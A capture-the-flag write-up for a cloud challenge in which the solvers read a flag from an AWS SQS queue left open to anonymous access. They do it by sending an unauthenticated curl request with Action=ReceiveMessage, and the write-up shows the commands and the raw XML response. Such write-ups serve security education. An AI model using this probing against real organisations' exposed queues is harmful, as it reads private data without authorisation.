
# Cant stop me now

 * Category: Cloud
 * Solved by the JCTF Team

## Description

> Frankly this challenge is impossible, give up now.
> 
> If you really insists, take this:
> 
> https://sqs.il-central-1.amazonaws.com/447694922079/production-queue

## Solution

We visit the attached link and get the following response:

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/cant_stop_me_now]
└─$ curl https://sqs.il-central-1.amazonaws.com/447694922079/production-queue
<UnknownOperationException/>
```

Searching Google for `UnknownOperationException`, the first result is 
[this StackOverflow question](https://stackoverflow.[AWS_SECRET_REMOVED]xception-is-always-returned-by-amazon-sqs).

The answer is:

> This is not POST request. It is GET. 
> 
> http://sqs.us-east-1.amazonaws.com/123456789012/testQueue/
> ?Action=ReceiveMessage
> &WaitTimeSeconds=10
> &MaxNumberOfMessages=5
> &VisibilityTimeout=15
> &AttributeName=All;
> &Version=2012-11-05
> &Expires=2013-10-25T22%3A52%3A43PST
> &AUTHPARAMS
> 
> I was not mentioning the request parameters so not getting the result. That was the issue.

The error says "Unknown Operation", let's try adding the `Action`?

```console
┌──(user@kali3)-[/media/sf_CTFs/appsec/cant_stop_me_now]
└─$ curl -X POST "https://sqs.il-central-1.amazonaws.com/447694922079/production-queue?Action=ReceiveMessage"
<?xml version="1.0"?><ReceiveMessageResponse xmlns="http://queue.amazonaws.com/doc/2012-11-05/"><ReceiveMessageResult><Message><MessageId>ed400300-c26e-46a5-898f-6dc9ae53f779</MessageId><ReceiptHandle>[AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED][AWS_SECRET_REMOVED]aSzYxYO8gw==</ReceiptHandle><MD5OfBody>e6eb62e9f83d493cd95a9278ffdb6128</MD5OfBody><Body>AppSec-IL{mama_look_at_me_i_can_read}</Body></Message></ReceiveMessageResult><ResponseMetadata><RequestId>d0a23b86-a511-525f-b685-5b3d692acc10</RequestId></ResponseMetadata></ReceiveMessageResponse>
```

The flag: `AppSec-IL{mama_look_at_me_i_can_read}`